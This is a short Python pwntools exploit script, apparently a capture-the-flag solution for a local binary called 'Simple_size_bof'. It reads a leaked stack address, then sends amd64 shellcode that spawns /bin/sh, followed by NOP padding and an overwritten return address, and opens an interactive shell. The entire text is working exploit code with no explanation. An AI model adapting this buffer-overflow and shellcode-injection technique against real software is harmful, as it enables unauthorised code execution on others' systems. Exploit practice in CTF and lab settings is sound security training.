from pwn import *

p = process("./Simple_size_bof")
#context.log_level = 'DEBUG'
context.arch = 'amd64'

padding = 0x6d30 + 8
shellcode = shellcraft.amd64.linux.sh()
print "shellcode size :",len(asm(shellcode))

print p.recvuntil("\n")
print p.recvuntil("0x"),
buffer = p.recv(12)
print buffer


payload = ''
payload += asm(shellcode)
payload += '\x90'*(padding - len(asm(shellcode)))
payload += p64(int(buffer, 16))

p.sendline(payload)
p.interactive()
